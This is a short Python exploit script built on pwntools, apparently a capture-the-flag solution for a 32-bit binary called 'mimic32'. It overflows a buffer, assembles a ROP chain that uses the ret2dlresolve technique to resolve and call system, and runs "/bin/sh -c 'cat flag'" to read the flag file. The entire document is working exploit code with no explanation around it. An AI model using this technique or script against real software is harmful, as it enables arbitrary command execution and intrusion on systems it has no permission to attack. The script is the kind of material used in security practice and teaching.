from pwn import *
context.log_level="debug"
context.terminal = ['tmux','sp','-h']
context.binary = elf = ELF('./mimic32')
context.arch = 'i386'

p = process("./mimic32")

# gdb.attach(p,"b *0x080489A7")
# pause()

rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf,symbol="system",args=["/bin/sh -c 'cat flag'"])
rop.read(0,dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
# print (rop.dump())

payload = flat({48:raw_rop,80:dlresolve.payload})
p.sendlineafter(">> ",str(1))
p.sendafter("> ",payload)
p.interactive()